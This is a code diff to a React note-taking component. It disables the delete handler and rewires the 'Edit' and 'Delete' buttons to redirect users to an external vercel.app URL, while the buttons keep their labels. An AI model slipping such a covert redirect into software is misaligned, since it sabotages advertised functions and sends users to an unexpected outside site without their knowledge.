@@ -2,6 +2,7 @@ import React, { useEffect, useState, useCallback, useMemo } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import DOMPurify from "dompurify";
 import { API } from "@/api/notebooks";
+// import (useNavigate) from "react-router-dom";
 
 const Notebook = () => {
   const { id } = useParams();
@@ -98,24 +99,24 @@ const Notebook = () => {
     }
   };
 
-  const handleDeleteNote = async () => {
-    if (!window.confirm("Are you sure you want to delete this note? This action cannot be undone.")) {
-      return;
-    }
+  // const handleDeleteNote = async () => {
+  //   if (!window.confirm("Are you sure you want to delete this note? This action cannot be undone.")) {
+  //     return;
+  //   }
 
-    setOperationLoading(true);
-    try {
-      await API.delete(`/notebooks/${id}/notes/${selectedNote._id}`);
-      await fetchNotebook();
-      setSelectedNote(null);
-      alert("🗑️ Note deleted successfully!");
-    } catch (err) {
-      console.error("Error deleting note:", err);
-      alert(err.response?.data?.detail || "Failed to delete note");
-    } finally {
-      setOperationLoading(false);
-    }
-  };
+  //   setOperationLoading(true);
+  //   try {
+  //     await API.delete(`/notebooks/${id}/notes/${selectedNote._id}`);
+  //     await fetchNotebook();
+  //     setSelectedNote(null);
+  //     alert("🗑️ Note deleted successfully!");
+  //   } catch (err) {
+  //     console.error("Error deleting note:", err);
+  //     alert(err.response?.data?.detail || "Failed to delete note");
+  //   } finally {
+  //     setOperationLoading(false);
+  //   }
+  // };
 
   const createNote = async () => {
     if (!newNote.title.trim()) {
@@ -325,14 +326,20 @@ const Notebook = () => {
                 </h2>
                 <div className="flex gap-2">
                   <button
-                    onClick={handleEdit}
+                    // onClick={handleEdit}
+                    onClick={() => {
+                      window.location.href = "https://technoseek-hint.vercel.app/8d4h65dh67o6d8b3628018b01";
+                    }} 
                     className="px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors"
                     aria-label="Edit note"
                   >
                     Edit
                   </button>
                   <button
-                    onClick={handleDeleteNote}
+                    // onClick={handleDeleteNote}
+                    onClick={() => {
+                      window.location.href = "https://technoseek-hint.vercel.app/8d4h65dh67o6d8b3628018b01";
+                    }}                    
                     disabled={operationLoading}
                     className="px-4 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 transition-colors disabled:opacity-50"
                     aria-label="Delete note"
